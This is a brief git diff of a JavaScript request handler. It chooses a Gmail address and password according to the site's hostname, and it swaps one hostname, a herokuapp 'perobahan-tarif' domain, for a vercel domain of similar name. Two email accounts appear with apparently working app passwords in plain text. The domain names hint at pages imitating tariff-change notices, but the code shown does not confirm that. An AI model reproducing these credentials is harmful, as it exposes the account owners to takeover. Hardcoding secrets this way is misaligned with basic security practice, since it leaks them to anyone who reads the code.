@@ -16,7 +16,7 @@ export default function handler(req, res) {
         email = 'angga13zx@gmail.com' ;
         pass = 'szssfkfwyhtjtbkg' ;
         
-    } else if(url == 'perobahan-tarif.herokuapp.com'){
+    } else if(url == 'tarif--perubahanbarulama.vercel.app'){
         email = 'samsudin19.01.12@gmail.com';
         pass = 'nsozbvpgogzlfeqg';
 
